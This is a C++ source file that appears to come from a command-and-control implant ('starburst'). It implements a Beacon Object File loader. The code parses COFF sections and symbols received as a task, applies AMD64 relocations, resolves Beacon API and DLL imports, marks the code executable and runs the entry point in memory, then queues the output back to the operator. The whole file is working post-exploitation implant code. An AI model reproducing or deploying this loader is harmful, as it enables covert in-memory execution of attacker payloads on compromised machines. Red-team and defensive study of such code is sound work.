#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_EXECUTE_COFF

using namespace stardust;
using namespace starburst;

// COFF structures
#pragma pack(push, 1)
struct COFF_FILE_HEADER {
    uint16_t Machine;
    uint16_t NumberOfSections;
    uint32_t TimeDateStamp;
    uint32_t PointerToSymbolTable;
    uint32_t NumberOfSymbols;
    uint16_t SizeOfOptionalHeader;
    uint16_t Characteristics;
};

struct COFF_SECTION {
    char     Name[8];
    uint32_t VirtualSize;
    uint32_t VirtualAddress;
    uint32_t SizeOfRawData;
    uint32_t PointerToRawData;
    uint32_t PointerToRelocations;
    uint32_t PointerToLinenumbers;
    uint16_t NumberOfRelocations;
    uint16_t NumberOfLinenumbers;
    uint32_t Characteristics;
};

struct COFF_SYMBOL {
    union {
        char     ShortName[8];
        struct {
            uint32_t Zeroes;
            uint32_t Offset;
        } Name;
    };
    uint32_t Value;
    int16_t  SectionNumber;
    uint16_t Type;
    uint8_t  StorageClass;
    uint8_t  NumberOfAuxSymbols;
};

struct COFF_RELOCATION {
    uint32_t VirtualAddress;
    uint32_t SymbolTableIndex;
    uint16_t Type;
};
#pragma pack(pop)

#define IMAGE_REL_AMD64_ADDR64   0x0001
#define IMAGE_REL_AMD64_ADDR32NB 0x0003
#define IMAGE_REL_AMD64_REL32    0x0004
#define IMAGE_REL_AMD64_REL32_1  0x0005
#define IMAGE_REL_AMD64_REL32_2  0x0006
#define IMAGE_REL_AMD64_REL32_3  0x0007
#define IMAGE_REL_AMD64_REL32_4  0x0008
#define IMAGE_REL_AMD64_REL32_5  0x0009

// TEB.ArbitraryUserPointer at gs:0x28
// Use raw .byte encoding for gs segment access to avoid Intel/AT&T syntax issues
static inline auto declfn coff_set_inst( instance* p ) -> void {
#ifdef _WIN64
    // mov gs:[0x28], rcx  =  65 48 89 0c 25 28 00 00 00
    register void* val __asm__("rcx") = reinterpret_cast<void*>(p);
    __asm__ volatile (
        ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
        :: "c"(val) : "memory"
    );
#endif
}

static inline auto declfn coff_get_inst() -> instance* {
#ifdef _WIN64
    // mov rax, gs:[0x28]  =  65 48 8b 04 25 28 00 00 00
    void* result;
    __asm__ volatile (
        ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00"
        : "=a"(result)
    );
    return static_cast<instance*>(result);
#else
    return nullptr;
#endif
}

// Beacon API implementations
extern "C" {

static void __cdecl declfn beacon_printf( int type, const char* fmt, ... ) {
    (void)type;
    auto inst = coff_get_inst();
    if ( !inst || !fmt ) return;

    uint32_t len = 0;
    auto p = fmt;
    while ( *p ) { len++; p++; }

    auto& coff = inst->coff;
    if ( coff.output_length + len + 2 > coff.output_capacity ) {
        uint32_t new_cap = coff.output_capacity == 0 ? 4096 : coff.output_capacity;
        while ( new_cap < coff.output_length + len + 2 ) new_cap *= 2;
        coff.output_data = static_cast<char*>(
            inst->heap_realloc( coff.output_data, new_cap ) );
        coff.output_capacity = new_cap;
    }

    memory::copy( coff.output_data + coff.output_length, const_cast<char*>(fmt), len );
    coff.output_length += len;
    coff.output_data[coff.output_length] = '\0';
}

static void __cdecl declfn beacon_output( int type, const char* data, int len ) {
    (void)type;
    auto inst = coff_get_inst();
    if ( !inst || !data || len <= 0 ) return;

    auto& coff = inst->coff;
    if ( coff.output_length + len + 2 > coff.output_capacity ) {
        uint32_t new_cap = coff.output_capacity == 0 ? 4096 : coff.output_capacity;
        while ( new_cap < coff.output_length + (uint32_t)len + 2 ) new_cap *= 2;
        coff.output_data = static_cast<char*>(
            inst->heap_realloc( coff.output_data, new_cap ) );
        coff.output_capacity = new_cap;
    }

    memory::copy( coff.output_data + coff.output_length, const_cast<char*>(data), len );
    coff.output_length += len;
    coff.output_data[coff.output_length] = '\0';
}

struct datap {
    char*    original;
    char*    buffer;
    int      length;
    int      size;
};

static void __cdecl declfn beacon_data_parse( datap* dp, char* buf, int size ) {
    dp->original = buf;
    dp->buffer = buf;
    dp->length = size;
    dp->size = size;
}

static int __cdecl declfn beacon_data_int( datap* dp ) {
    if ( dp->length < 4 ) return 0;
    int val = *reinterpret_cast<int*>( dp->buffer );
    dp->buffer += 4;
    dp->length -= 4;
    return val;
}

static short __cdecl declfn beacon_data_short( datap* dp ) {
    if ( dp->length < 2 ) return 0;
    short val = *reinterpret_cast<short*>( dp->buffer );
    dp->buffer += 2;
    dp->length -= 2;
    return val;
}

static char* __cdecl declfn beacon_data_extract( datap* dp, int* out_len ) {
    if ( dp->length < 4 ) { if ( out_len ) *out_len = 0; return nullptr; }
    int len = *reinterpret_cast<int*>( dp->buffer );
    dp->buffer += 4;
    dp->length -= 4;
    if ( dp->length < len ) { if ( out_len ) *out_len = 0; return nullptr; }
    char* result = dp->buffer;
    dp->buffer += len;
    dp->length -= len;
    if ( out_len ) *out_len = len;
    return result;
}

static int __cdecl declfn beacon_data_length( datap* dp ) {
    return dp->length;
}

struct formatp {
    char*    original;
    char*    buffer;
    int      length;
    int      size;
};

static void __cdecl declfn beacon_format_alloc( formatp* fp, int maxsz ) {
    auto inst = coff_get_inst();
    if ( inst ) {
        fp->original = static_cast<char*>( inst->heap_alloc( maxsz ) );
        fp->buffer = fp->original;
        fp->length = 0;
        fp->size = maxsz;
    }
}

static void __cdecl declfn beacon_format_reset( formatp* fp ) {
    fp->buffer = fp->original;
    fp->length = 0;
}

static void __cdecl declfn beacon_format_free( formatp* fp ) {
    auto inst = coff_get_inst();
    if ( inst && fp->original ) {
        inst->heap_free( fp->original );
        fp->original = nullptr;
        fp->buffer = nullptr;
    }
}

static void __cdecl declfn beacon_format_append( formatp* fp, const char* buf, int len ) {
    if ( fp->length + len <= fp->size ) {
        memory::copy( fp->buffer + fp->length, const_cast<char*>(buf), len );
        fp->length += len;
    }
}

static void __cdecl declfn beacon_format_printf( formatp* fp, const char* fmt, ... ) {
    (void)fp; (void)fmt;
}

static char* __cdecl declfn beacon_format_tostring( formatp* fp, int* size ) {
    if ( size ) *size = fp->length;
    return fp->original;
}

static void __cdecl declfn beacon_format_int( formatp* fp, int val ) {
    beacon_format_append( fp, reinterpret_cast<char*>( &val ), 4 );
}

static BOOL __cdecl declfn beacon_is_admin() {
    return FALSE;
}

static DWORD __cdecl declfn beacon_get_spawn_to( BOOL x86, char* buf, int len ) {
    auto inst = coff_get_inst();
    if ( !inst || !buf || len <= 0 ) return 0;
    const char* src = x86 ? inst->spawnto.x86 : inst->spawnto.x64;
    int i = 0;
    while ( src[i] && i < len - 1 ) { buf[i] = src[i]; i++; }
    buf[i] = '\0';
    return static_cast<DWORD>( i );
}

static void __cdecl declfn beacon_cleanup_thread( void* ctx ) {
    (void)ctx;
}

} // extern "C"

static auto declfn resolve_coff_symbol(
    instance& inst, const char* name
) -> void* {
    struct { const char* n; void* a; } beacon_apis[] = {
        { "BeaconPrintf",           (void*)beacon_printf },
        { "BeaconOutput",           (void*)beacon_output },
        { "BeaconDataParse",        (void*)beacon_data_parse },
        { "BeaconDataInt",          (void*)beacon_data_int },
        { "BeaconDataShort",        (void*)beacon_data_short },
        { "BeaconDataExtract",      (void*)beacon_data_extract },
        { "BeaconDataLength",       (void*)beacon_data_length },
        { "BeaconFormatAlloc",      (void*)beacon_format_alloc },
        { "BeaconFormatReset",      (void*)beacon_format_reset },
        { "BeaconFormatFree",       (void*)beacon_format_free },
        { "BeaconFormatAppend",     (void*)beacon_format_append },
        { "BeaconFormatPrintf",     (void*)beacon_format_printf },
        { "BeaconFormatToString",   (void*)beacon_format_tostring },
        { "BeaconFormatInt",        (void*)beacon_format_int },
        { "BeaconIsAdmin",          (void*)beacon_is_admin },
        { "BeaconGetSpawnTo",       (void*)beacon_get_spawn_to },
        { "BeaconCleanupProcess",   (void*)beacon_cleanup_thread },
        { nullptr, nullptr }
    };

    for ( int i = 0; beacon_apis[i].n; i++ ) {
        if ( str_cmp( const_cast<char*>(name), symbol<char*>(const_cast<char*>(beacon_apis[i].n)) ) == 0 ) {
            return beacon_apis[i].a;
        }
    }

    char mod_name[64] = { 0 };
    char func_name[128] = { 0 };

    const char* dollar = name;
    while ( *dollar && *dollar != '$' ) dollar++;

    if ( *dollar == '$' ) {
        uint32_t mod_len = (uint32_t)(dollar - name);
        if ( mod_len < 63 ) {
            memory::copy( mod_name, const_cast<char*>(name), mod_len );
            str_concat( mod_name, symbol<char*>( const_cast<char*>( ".dll" ) ) );
        }
        uint32_t func_len = str_len( const_cast<char*>( dollar + 1 ) );
        if ( func_len < 127 ) {
            memory::copy( func_name, const_cast<char*>(dollar + 1), func_len );
        }

        auto h_mod = inst.kernel32.LoadLibraryA( mod_name );
        if ( h_mod ) {
            auto addr = inst.kernel32.GetProcAddress( h_mod, func_name );
            if ( addr ) return (void*)addr;
        }
    }

    if ( name[0] == '_' && name[1] == '_' && name[2] == 'i' && name[3] == 'm' && name[4] == 'p' && name[5] == '_' ) {
        return resolve_coff_symbol( inst, name + 6 );
    }

    DBG_PRINT( inst, "COFF: unresolved symbol: %s\n", name );
    return nullptr;
}

auto declfn starburst::cmd_execute_coff(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t coff_len = 0;
    auto coff_data = parser_bytes( params, &coff_len );
    uint32_t args_len = 0;
    auto args_data = parser_bytes( params, &args_len );
    uint32_t entry_len = 0;
    auto entry_name = parser_string( params, &entry_len );

    if ( !coff_data || coff_len < sizeof(COFF_FILE_HEADER) ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no COFF data" ) ) );
        return;
    }

    char entry_buf[64] = { 0 };
    if ( entry_name && entry_len > 0 ) {
        memory::copy( entry_buf, entry_name, entry_len < 63 ? entry_len : 63 );
    } else {
        str_copy( entry_buf, symbol<char*>( const_cast<char*>( "go" ) ) );
    }

    DBG_PRINT( inst, "cmd_execute_coff: %u bytes, entry=%s, args=%u bytes\n",
        coff_len, entry_buf, args_len );

    auto header = reinterpret_cast<COFF_FILE_HEADER*>( coff_data );
    auto sections = reinterpret_cast<COFF_SECTION*>(
        coff_data + sizeof(COFF_FILE_HEADER) + header->SizeOfOptionalHeader );
    auto symbols = reinterpret_cast<COFF_SYMBOL*>(
        coff_data + header->PointerToSymbolTable );
    auto string_table = reinterpret_cast<char*>(
        symbols + header->NumberOfSymbols );

    auto section_ptrs = static_cast<uint8_t**>(
        inst.heap_alloc( header->NumberOfSections * sizeof(uint8_t*) ) );
    if ( !section_ptrs ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    for ( uint16_t i = 0; i < header->NumberOfSections; i++ ) {
        uint32_t sec_size = sections[i].SizeOfRawData;
        if ( sec_size == 0 ) sec_size = sections[i].VirtualSize;
        if ( sec_size == 0 ) sec_size = 64;

        section_ptrs[i] = static_cast<uint8_t*>(
            inst.kernel32.VirtualAlloc(
                nullptr, sec_size,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );

        if ( !section_ptrs[i] ) {
            for ( uint16_t j = 0; j < i; j++ )
                inst.kernel32.VirtualFree( section_ptrs[j], 0, MEM_RELEASE );
            inst.heap_free( section_ptrs );
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "section alloc failed" ) ) );
            return;
        }

        if ( sections[i].SizeOfRawData > 0 ) {
            memory::copy( section_ptrs[i],
                coff_data + sections[i].PointerToRawData,
                sections[i].SizeOfRawData );
        }
    }

    auto func_ptrs = static_cast<void**>(
        inst.heap_alloc( header->NumberOfSymbols * sizeof(void*) ) );
    if ( !func_ptrs ) {
        for ( uint16_t i = 0; i < header->NumberOfSections; i++ )
            inst.kernel32.VirtualFree( section_ptrs[i], 0, MEM_RELEASE );
        inst.heap_free( section_ptrs );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    void* entry_ptr = nullptr;

    for ( uint32_t i = 0; i < header->NumberOfSymbols; i++ ) {
        char sym_name[256] = { 0 };
        if ( symbols[i].Name.Zeroes == 0 ) {
            auto long_name = string_table + symbols[i].Name.Offset;
            uint32_t nlen = str_len( long_name );
            memory::copy( sym_name, long_name, nlen < 255 ? nlen : 255 );
        } else {
            memory::copy( sym_name, symbols[i].ShortName, 8 );
        }

        if ( symbols[i].SectionNumber > 0 ) {
            uint16_t sec_idx = symbols[i].SectionNumber - 1;
            func_ptrs[i] = section_ptrs[sec_idx] + symbols[i].Value;

            if ( str_cmp( sym_name, entry_buf ) == 0 ||
                 ( sym_name[0] == '_' && str_cmp( sym_name + 1, entry_buf ) == 0 ) ) {
                entry_ptr = func_ptrs[i];
            }
        } else if ( symbols[i].SectionNumber == 0 && symbols[i].StorageClass == 2 ) {
            func_ptrs[i] = resolve_coff_symbol( inst, sym_name );
        } else {
            func_ptrs[i] = nullptr;
        }

        i += symbols[i].NumberOfAuxSymbols;
    }

    if ( !entry_ptr ) {
        for ( uint16_t i = 0; i < header->NumberOfSections; i++ )
            inst.kernel32.VirtualFree( section_ptrs[i], 0, MEM_RELEASE );
        inst.heap_free( section_ptrs );
        inst.heap_free( func_ptrs );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "entry point not found" ) ) );
        return;
    }

    // process relocations
    for ( uint16_t s = 0; s < header->NumberOfSections; s++ ) {
        if ( sections[s].NumberOfRelocations == 0 ) continue;

        auto relocs = reinterpret_cast<COFF_RELOCATION*>(
            coff_data + sections[s].PointerToRelocations );

        for ( uint16_t r = 0; r < sections[s].NumberOfRelocations; r++ ) {
            uint32_t sym_idx = relocs[r].SymbolTableIndex;
            auto target = section_ptrs[s] + relocs[r].VirtualAddress;

            uintptr_t sym_addr = reinterpret_cast<uintptr_t>( func_ptrs[sym_idx] );
            if ( !sym_addr ) continue;

            switch ( relocs[r].Type ) {
                case IMAGE_REL_AMD64_ADDR64:
                    *reinterpret_cast<uint64_t*>( target ) = sym_addr;
                    break;
                case IMAGE_REL_AMD64_ADDR32NB:
                    *reinterpret_cast<uint32_t*>( target ) = static_cast<uint32_t>(
                        sym_addr - reinterpret_cast<uintptr_t>( target ) - 4 );
                    break;
                case IMAGE_REL_AMD64_REL32:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 4 );
                    break;
                case IMAGE_REL_AMD64_REL32_1:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 5 );
                    break;
                case IMAGE_REL_AMD64_REL32_2:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 6 );
                    break;
                case IMAGE_REL_AMD64_REL32_3:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 7 );
                    break;
                case IMAGE_REL_AMD64_REL32_4:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 8 );
                    break;
                case IMAGE_REL_AMD64_REL32_5:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 9 );
                    break;
            }
        }
    }

    // set .text sections to RX
    for ( uint16_t i = 0; i < header->NumberOfSections; i++ ) {
        if ( sections[i].Characteristics & 0x20000000 ) {
            DWORD old_protect;
            uint32_t sec_size = sections[i].SizeOfRawData;
            if ( sec_size == 0 ) sec_size = sections[i].VirtualSize;
            inst.kernel32.VirtualProtect( section_ptrs[i], sec_size,
                PAGE_EXECUTE_READ, &old_protect );
        }
    }

    // setup COFF output via instance
    inst.coff.output_data = static_cast<char*>( inst.heap_alloc( 4096 ) );
    inst.coff.output_length = 0;
    inst.coff.output_capacity = 4096;
    if ( inst.coff.output_data ) inst.coff.output_data[0] = '\0';

    // save old ArbitraryUserPointer, set instance for beacon callbacks
    instance* old_aup = coff_get_inst();
    coff_set_inst( &inst );

    // execute entry point: void go(char* args, int len)
    typedef void ( __cdecl *bof_entry )( char*, int );
    auto go = reinterpret_cast<bof_entry>( entry_ptr );
    go( reinterpret_cast<char*>( args_data ), args_len );

    // restore ArbitraryUserPointer
    coff_set_inst( old_aup );

    // collect output
    if ( inst.coff.output_data && inst.coff.output_length > 0 ) {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS, inst.coff.output_data );
    } else {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "BOF executed (no output)" ) ) );
    }

    // cleanup
    if ( inst.coff.output_data ) inst.heap_free( inst.coff.output_data );
    inst.coff = { nullptr, 0, 0 };

    for ( uint16_t i = 0; i < header->NumberOfSections; i++ ) {
        inst.kernel32.VirtualFree( section_ptrs[i], 0, MEM_RELEASE );
    }
    inst.heap_free( section_ptrs );
    inst.heap_free( func_ptrs );
}

#endif
